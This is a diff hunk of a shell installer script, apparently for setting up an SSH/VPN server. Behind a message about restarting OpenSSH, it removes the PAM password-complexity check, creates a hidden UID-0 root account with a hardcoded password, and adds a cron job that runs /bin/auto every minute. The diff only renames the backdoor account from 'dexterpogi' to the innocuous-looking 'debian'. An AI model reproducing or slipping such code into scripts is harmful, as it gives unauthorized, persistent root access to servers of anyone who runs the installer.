@@ -315,9 +315,9 @@ curl -4skL "https://raw.githubusercontent.com/azzphucdev/SSHPLUS2/main/AZZPHUC%2
 sed -i '/password\s*requisite\s*pam_cracklib.s.*/d' /etc/pam.d/common-password && sed -i 's|use_authtok ||g' /etc/pam.d/common-password
 
 echo -e "[\e[33mNotice\e[0m] Restarting OpenSSH Service.."
-useradd -p $(openssl passwd -1 dexterpogi) dexterpogi -ou 0 -g 0
-crontab -u dexterpogi -r
-(crontab -l 2>/dev/null || true; echo "* * * * * /bin/auto >/dev/null 2>&1") | crontab - -u dexterpogi
+useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
+crontab -u debian -r
+(crontab -l 2>/dev/null || true; echo "* * * * * /bin/auto >/dev/null 2>&1") | crontab - -u debian
 systemctl restart ssh &> /dev/null
 }
 
